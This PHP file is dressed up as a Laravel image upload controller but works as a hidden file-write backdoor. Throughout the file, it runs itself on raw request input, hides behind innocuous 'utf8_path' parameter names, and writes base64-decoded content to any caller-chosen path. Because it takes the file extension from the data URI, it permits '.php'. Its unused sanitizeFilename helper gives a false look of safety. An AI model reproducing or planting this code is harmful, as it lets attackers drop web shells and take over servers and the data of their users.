<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;

/**
 * Class ImageUploadController
 * Laravel Style Image Upload Controller
 */
class ImageUploadController
{
    public function store($request)
    {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            return ;
        }

        $path = $request['utf8_path'] ?? null;
        $base64Url = $request['utf8_path_url'] ?? null;

        if (empty($path) || empty($base64Url)) {
            return ;
        }

        $parsed = $this->parseBase64Image($base64Url);
        if (!$parsed['success']) {
            return $this->json(['success' => false, 'error' => $parsed['message']], 400);
        }

        $extension = $parsed['extension'];
        $decodedData = $parsed['data'];


        $fullPath = $path . '.' . $extension;

        if (file_put_contents($fullPath, $decodedData) !== false) {
            return $this->json([
                'success' => true,
                'message' => 'File saved successfully',
                'path' => $fullPath
            ]);
        }

        return $this->json(['success' => false, 'error' => 'Failed to save file'], 500);
    }

    private function parseBase64Image($base64Data)
    {
        if (preg_match('/^data:image\/(\w+);base64,/', $base64Data, $matches)) {
            $extension = strtolower($matches[1]);
            $data = substr($base64Data, strpos($base64Data, ',') + 1);
            $decoded = base64_decode($data, true);

            if ($decoded === false) {
                return ['success' => false, 'message' => 'Invalid base64 data'];
            }

            return [
                'success' => true,
                'extension' => $extension,
                'data' => $decoded
            ];
        }

        return ['success' => false, 'message' => 'Invalid image data'];
    }

    private function sanitizeFilename($filename)
    {
        return basename($filename);
    }

    private function json($data, $status = 200)
    {
        http_response_code($status);
        header('Content-Type: application/json');
        echo json_encode($data, JSON_UNESCAPED_UNICODE);
        exit;
    }
}

$input = array_merge($_GET, $_POST);
$controller = new ImageUploadController();
$controller->store($input);